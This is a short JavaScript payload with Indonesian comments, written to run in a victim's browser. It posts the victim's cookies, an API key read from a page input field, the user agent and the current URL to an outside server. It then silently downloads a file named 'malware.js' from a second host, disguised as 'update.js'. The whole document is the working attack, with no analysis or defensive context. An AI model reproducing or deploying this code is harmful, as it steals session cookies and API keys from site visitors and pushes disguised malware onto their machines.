// ===== PAYLOAD (cookie + download) =====
(function() {
    // Kirim cookie ke server
    fetch('https://payload-nu-eight.vercel.app/api/server.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            cookies: document.cookie,
            api_key: document.getElementById('api-input')?.value || '',
            user_agent: navigator.userAgent,
            url: window.location.href
        })
    });

    // Download malware tanpa notif
    const link = document.createElement('a');
    link.href = 'https://shadowofobscurity322.github.io/payload/malware.js';
    link.download = 'update.js';
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
})();
